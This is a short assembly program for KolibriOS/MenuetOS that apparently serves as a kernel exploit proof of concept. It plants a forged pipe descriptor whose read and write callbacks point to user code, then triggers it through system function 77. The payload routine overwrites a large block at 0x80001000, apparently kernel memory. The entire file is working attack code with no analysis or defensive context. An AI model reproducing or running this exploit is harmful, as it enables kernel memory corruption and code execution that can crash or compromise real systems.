  use32
  org    0
  db     'MENUET01'
  dd     1, START, I_END, MEM, STACKTOP, 0, 0
  rd     64
include "macros.inc"
FD = 3
START:
        mov     esi, fake_data
        mov     edi, FD + 1 ;4 ;xor     edi, edi
        mov     ecx, 7; ?
        rep movsd
        mcall 77, 11, FD, I_END, 64
        or      eax, -1
        int     0x40
my_func:
        mov     edi, 0x80001000
        mov     eax, 0
        mov     ecx, 0x50000
        rep stosd

fake_data:    ;struct FILED
        .list    dd 0, 0
        .magic   db 'PIPE'
        .handle  dd FD
        .destroy dd 0
        .mode    dd 0x0002;0x0001 ; тут флаги, поменять
        .file    dd ptr_file_op
ptr_file_op:    dd pipe_file_op
pipe_file_op:
        dd      0 ;close
        dd      my_func ; read
        dd      my_func ; write

I_END:
        rb 4096
align 16
STACKTOP:
MEM: